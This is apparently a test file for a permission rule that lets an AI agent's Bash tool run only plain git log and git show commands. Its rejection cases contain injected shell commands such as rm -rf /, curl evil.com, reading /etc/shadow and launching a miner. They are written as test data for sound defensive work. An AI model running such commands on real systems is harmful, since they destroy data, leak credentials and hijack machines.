import { describe, expect, it } from "bun:test";
import { ALLOW, NEXT, type ToolCall } from "toolgate";
import allowGitLog from "../allow-git-log";

function bash(command: string): ToolCall {
  return {
    tool: "Bash",
    args: { command },
    context: { cwd: "/tmp", env: {}, projectRoot: null },
  };
}

describe("allow-git-log", () => {
  describe("allows safe git log commands", () => {
    const allowed = [
      "git log",
      "git log --oneline",
      "git log --oneline -5",
      "git log --oneline --graph",
      "git log --stat",
      "git log -p src/file.ts",
      "git log --author=someone",
      "git log main..HEAD",
      "git log --pretty=format:%h",
    ];

    for (const cmd of allowed) {
      it(`allows: ${cmd}`, async () => {
        const result = await allowGitLog.handler(bash(cmd));
        expect(result.verdict).toBe(ALLOW);
      });
    }
  });

  describe("rejects command chaining", () => {
    const rejected = [
      "git log && rm -rf /",
      "git log || echo pwned",
      "git log ; curl evil.com",
      "git log | bash -c evil",
      "git log & bitcoin-miner",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGitLog.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects shell substitution", () => {
    const rejected = [
      "git log $(rm -rf /)",
      "git log `cat /etc/shadow`",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGitLog.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects multiline commands", () => {
    const rejected = [
      "git log\nrm -rf /",
      "git log --oneline\necho pwned",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${JSON.stringify(cmd)}`, async () => {
        const result = await allowGitLog.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("allows safe git show commands", () => {
    const allowed = [
      "git show",
      "git show HEAD",
      "git show HEAD:src/file.ts",
      "git show abc1234",
      "git show --stat",
      "git show --format=%B HEAD",
      "git show v1.0.0",
    ];

    for (const cmd of allowed) {
      it(`allows: ${cmd}`, async () => {
        const result = await allowGitLog.handler(bash(cmd));
        expect(result.verdict).toBe(ALLOW);
      });
    }
  });

  describe("rejects non-git-log commands", () => {
    const rejected = [
      "git commit -m 'msg'",
      "git push",
      "echo git log",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGitLog.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  it("passes through non-Bash tools", async () => {
    const call: ToolCall = {
      tool: "Read",
      args: {},
      context: { cwd: "/tmp", env: {}, projectRoot: null },
    };
    const result = await allowGitLog.handler(call);
    expect(result.verdict).toBe(NEXT);
  });
});
